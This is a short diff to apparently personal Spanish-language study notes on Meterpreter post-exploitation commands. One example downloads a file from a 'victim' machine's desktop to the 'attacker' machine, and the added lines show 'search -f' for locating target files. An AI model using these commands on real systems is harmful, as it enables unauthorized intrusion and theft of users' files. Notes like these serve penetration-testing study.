@@ -18,3 +18,9 @@ comando para descargar un archivo desde la maquina victima hacia la maquina atac
 ejemplo
     download c:\\users\\lola\\desktop\\kevin.txt /home/desktop/kevin.txt
 
+comando para buscar desde meterpreter la direccion de donde se encuentra un archivo , para confiri mas su existencia o copiar ruta 
+search -f {nombre del archivo ] 
+
+EJEMPLO 
+search -f objetivo.txt 
+
